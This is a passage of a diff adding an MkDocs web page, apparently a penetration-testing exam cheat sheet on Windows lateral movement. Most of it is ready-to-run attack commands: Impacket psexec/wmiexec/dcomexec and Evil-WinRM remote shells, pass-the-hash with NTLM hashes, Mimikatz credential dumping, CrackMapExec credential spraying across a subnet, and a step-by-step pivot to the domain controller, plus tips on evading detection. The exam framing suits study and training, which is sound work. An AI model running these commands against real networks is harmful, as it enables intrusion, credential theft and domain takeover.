+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>impacket-wmiexec<span class="w"> </span>DOMAIN/username:password@TARGET
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>
+</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="c1"># Step 3: Enumerate further</span>
+</span></code></pre></div>
+<h3 id="scenario-2-you-have-ntlm-hash">Scenario 2: You Have NTLM Hash</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1"># Step 1: Pass-the-Hash</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="c1"># Step 2: If PSExec fails, try WMI</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>impacket-wmiexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="c1"># Step 3: Dump credentials on new box</span>
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>mimikatz.exe<span class="w"> </span><span class="s2">&quot;privilege::debug&quot;</span><span class="w"> </span><span class="s2">&quot;sekurlsa::logonpasswords&quot;</span><span class="w"> </span><span class="s2">&quot;exit&quot;</span>
+</span></code></pre></div>
+<h3 id="scenario-3-pivot-through-multiple-hosts">Scenario 3: Pivot Through Multiple Hosts</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1"># Host A (your entry point)</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="c1"># Dump credentials</span>
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>mimikatz.exe<span class="w"> </span><span class="s2">&quot;privilege::debug&quot;</span><span class="w"> </span><span class="s2">&quot;sekurlsa::logonpasswords&quot;</span><span class="w"> </span><span class="s2">&quot;exit&quot;</span>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="c1"># Found: DOMAIN\user2 with hash</span>
+</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a>
+</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="c1"># Lateral move to Host B</span>
+</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a>impacket-wmiexec<span class="w"> </span>-hashes<span class="w"> </span>:HASH<span class="w"> </span>DOMAIN/user2@HOSTB
+</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a>
+</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a><span class="c1"># On Host B, dump more credentials</span>
+</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a>mimikatz.exe<span class="w"> </span><span class="s2">&quot;privilege::debug&quot;</span><span class="w"> </span><span class="s2">&quot;sekurlsa::logonpasswords&quot;</span><span class="w"> </span><span class="s2">&quot;exit&quot;</span>
+</span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a>
+</span><span id="__span-35-13"><a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a><span class="c1"># Found: DOMAIN\admin with hash</span>
+</span><span id="__span-35-14"><a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a>
+</span><span id="__span-35-15"><a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a><span class="c1"># Lateral move to DC</span>
+</span><span id="__span-35-16"><a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span>:HASH<span class="w"> </span>DOMAIN/admin@DC
+</span></code></pre></div>
+<h3 id="scenario-4-spray-and-move">Scenario 4: Spray and Move</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="c1"># Find all accessible systems</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">192</span>.168.1.0/24<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="c1"># Results show access to:</span>
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="c1"># 192.168.1.10 (Pwn3d!)</span>
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="c1"># 192.168.1.15 (Pwn3d!)</span>
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="c1"># 192.168.1.20 (Pwn3d!)</span>
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>
+</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a><span class="c1"># Get shell on each</span>
+</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>impacket-wmiexec<span class="w"> </span>DOMAIN/user:pass@192.168.1.10
+</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>impacket-wmiexec<span class="w"> </span>DOMAIN/user:pass@192.168.1.15
+</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a>impacket-wmiexec<span class="w"> </span>DOMAIN/user:pass@192.168.1.20
+</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a>
+</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a><span class="c1"># Dump credentials on each</span>
+</span><span id="__span-36-15"><a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a><span class="c1"># Find DA credentials</span>
+</span><span id="__span-36-16"><a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a><span class="c1"># Move to DC</span>
+</span></code></pre></div>
+<hr />
+<h2 id="quick-reference">Quick Reference</h2>
+<h3 id="essential-commands">Essential Commands</h3>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PsExec</strong></td>
+<td><code>impacket-psexec DOMAIN/user:pass@TARGET</code></td>
+</tr>
+<tr>
+<td><strong>WMIExec</strong></td>
+<td><code>impacket-wmiexec DOMAIN/user:pass@TARGET</code></td>
+</tr>
+<tr>
+<td><strong>SMBExec</strong></td>
+<td><code>impacket-smbexec DOMAIN/user:pass@TARGET</code></td>
+</tr>
+<tr>
+<td><strong>Evil-WinRM</strong></td>
+<td><code>evil-winrm -i TARGET -u user -p pass</code></td>
+</tr>
+<tr>
+<td><strong>RDP</strong></td>
+<td><code>xfreerdp /v:TARGET /u:user /p:pass</code></td>
+</tr>
+<tr>
+<td><strong>PTH PsExec</strong></td>
+<td><code>impacket-psexec -hashes :HASH DOMAIN/user@TARGET</code></td>
+</tr>
+<tr>
+<td><strong>PTH WMI</strong></td>
+<td><code>impacket-wmiexec -hashes :HASH DOMAIN/user@TARGET</code></td>
+</tr>
+<tr>
+<td><strong>CrackMapExec</strong></td>
+<td><code>crackmapexec smb TARGET -u user -p pass -x "cmd"</code></td>
+</tr>
+<tr>
+<td><strong>AtExec</strong></td>
+<td><code>impacket-atexec DOMAIN/user:pass@TARGET 'cmd'</code></td>
+</tr>
+<tr>
+<td><strong>DCOM</strong></td>
+<td><code>impacket-dcomexec DOMAIN/user:pass@TARGET</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="tool-selection-guide">Tool Selection Guide</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>Need interactive shell?
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>├─ Yes
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>│  ├─ Windows tools available? → PsExec.exe
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>│  ├─ WinRM enabled? → Evil-WinRM
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>│  └─ General → impacket-psexec
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>└─ No (single command)
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>   ├─ Stealth important? → impacket-atexec or impacket-dcomexec
+</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>   └─ Speed important? → impacket-wmiexec
+</span></code></pre></div>
+<hr />
+<h2 id="pro-tips">Pro Tips</h2>
+<div class="admonition tip">
+<p class="admonition-title"> Exam Tips</p>
+<ul>
+<li><strong>Always try multiple methods</strong> - one might work when others fail</li>
+<li><strong>PsExec is reliable</strong> but noisy - use first to verify access</li>
+<li><strong>WMIExec is stealthier</strong> - good for avoiding detection</li>
+<li><strong>Evil-WinRM is great</strong> if WinRM (5985/5986) is open</li>
+<li><strong>Document all credentials</strong> and where you found them</li>
+<li><strong>Test credentials immediately</strong> after obtaining them</li>
+<li><strong>Pivot systematically</strong> - document your path through network</li>
+</ul>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Credential Reuse</p>
+<ul>
+<li><strong>Try credentials everywhere</strong> - admins reuse passwords</li>
+<li><strong>Local admin hash</strong> often works on multiple machines</li>
+<li><strong>Domain credentials</strong> work across entire domain</li>
+<li><strong>Service accounts</strong> often have access to many systems</li>
+<li><strong>Use CrackMapExec</strong> to spray credentials across network</li>
+</ul>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Stealth Considerations</p>
+<ul>
+<li><strong>PsExec</strong> creates a service (logged)</li>
+<li><strong>WMI</strong> is stealthier, no service creation</li>
+<li><strong>DCOM</strong> is very stealthy</li>
+<li><strong>Scheduled tasks</strong> leave logs but work well</li>
+<li><strong>WinRM</strong> is legitimate admin traffic</li>
+</ul>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Common Mistakes</p>
+<ul>
+<li>Not trying multiple lateral movement methods</li>
+<li>Forgetting to check if WinRM is enabled</li>
+<li>Not documenting successful lateral moves</li>
+<li>Using wrong credential format (domain\user vs user@domain)</li>
+<li>Not cleaning up services/tasks after use</li>
+<li>Forgetting to URL-encode special characters in passwords</li>
+</ul>
+</div>
+<div class="admonition danger">
+<p class="admonition-title"> Restrictions</p>
+<ul>
+<li><strong>Document all lateral movement</strong> in your report</li>
+<li><strong>Note which credentials worked</strong> on which systems</li>
+<li><strong>Show the path</strong> of compromise (A → B → C → DC)</li>
+<li><strong>Include screenshots</strong> of successful access</li>
+<li><strong>Don't use automated exploitation</strong> beyond manual tools</li>
+</ul>
+</div>
+<hr />
+<h2 id="troubleshooting">Troubleshooting</h2>
+<h3 id="common-issues">Common Issues</h3>
+<p><strong>1. "Access Denied"</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c1"># User doesn&#39;t have admin rights on target</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="c1"># Try different user or check group membership</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>net<span class="w"> </span>user<span class="w"> </span>username<span class="w"> </span>/domain
+</span></code></pre></div></p>
+<p><strong>2. "Cannot connect to target"</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c1"># Firewall blocking</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="c1"># Try different method (WMI vs PsExec)</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="c1"># Check if service is running</span>
+</span></code></pre></div></p>
+<p><strong>3. "Authentication Failed"</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># Wrong credentials</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="c1"># Try different credential format</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="c1"># Check domain name is correct</span>
+</span></code></pre></div></p>
+<p><strong>4. WinRM "Access Denied"</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1"># User not in &quot;Remote Management Users&quot; group</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="c1"># Try: net localgroup &quot;Remote Management Users&quot; username /add</span>
+</span></code></pre></div></p>
+<p><strong>5. Hash not working</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="c1"># Restricted Admin mode disabled for RDP</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="c1"># Use different method (PSExec, WMI)</span>
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="c1"># Ensure using correct hash format (NTLM only, no LM)</span>
+</span></code></pre></div></p>
+<hr />
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket GitHub</a></li>
+<li><a href="https://wiki.porchetta.industries/">CrackMapExec Wiki</a></li>
+<li><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM GitHub</a></li>
+<li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec Documentation</a></li>
+<li><a href="https://attack.mitre.org/tactics/TA0008/">MITRE ATT&amp;CK - Lateral Movement</a></li>
+</ul>
+<hr />
+<h2 id="summary">Summary</h2>
+<h3 id="most-common-lateral-movement-commands">Most Common  Lateral Movement Commands</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1"># 1. PsExec with password</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>impacket-psexec<span class="w"> </span>DOMAIN/username:password@TARGET
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="c1"># 2. WMIExec with password</span>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>impacket-wmiexec<span class="w"> </span>DOMAIN/username:password@TARGET
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="c1"># 3. Evil-WinRM</span>
+</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password
+</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>
+</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a><span class="c1"># 4. Pass-the-Hash with PsExec</span>
+</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span>:NTLM_HASH<span class="w"> </span>DOMAIN/username@TARGET
+</span><span id="__span-43-12"><a id="__codelineno-43-12" name="__codelineno-43-12" href="#__codelineno-43-12"></a>
+</span><span id="__span-43-13"><a id="__codelineno-43-13" name="__codelineno-43-13" href="#__codelineno-43-13"></a><span class="c1"># 5. CrackMapExec for access check</span>
+</span><span id="__span-43-14"><a id="__codelineno-43-14" name="__codelineno-43-14" href="#__codelineno-43-14"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password
+</span><span id="__span-43-15"><a id="__codelineno-43-15" name="__codelineno-43-15" href="#__codelineno-43-15"></a>
+</span><span id="__span-43-16"><a id="__codelineno-43-16" name="__codelineno-43-16" href="#__codelineno-43-16"></a><span class="c1"># 6. CrackMapExec for command execution</span>
+</span><span id="__span-43-17"><a id="__codelineno-43-17" name="__codelineno-43-17" href="#__codelineno-43-17"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span>TARGET<span class="w"> </span>-u<span class="w"> </span>username<span class="w"> </span>-p<span class="w"> </span>password<span class="w"> </span>-x<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+</span></code></pre></div>
+<h3 id="lateral-movement-flow">Lateral Movement Flow</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>1. Obtain Credentials
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>   ↓
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>2. Verify Access (CrackMapExec)
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>   ↓
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>3. Get Shell (PsExec/WMI/WinRM)
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>   ↓
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>4. Dump Credentials (Mimikatz)
+</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>   ↓
+</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a>5. Repeat until Domain Admin
+</span></code></pre></div>
+<h3 id="remember">Remember</h3>
+<ol>
+<li><strong>Try multiple methods</strong> - different tools for different situations</li>
+<li><strong>Document everything</strong> - show your lateral movement path</li>
+<li><strong>Use hashes when you can't crack</strong> - Pass-the-Hash is powerful</li>
+<li><strong>Test credentials everywhere</strong> - reuse is common</li>
+<li><strong>Be systematic</strong> - enumerate, move, dump, repeat</li>
+</ol>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+    
+  </body>
+</html>
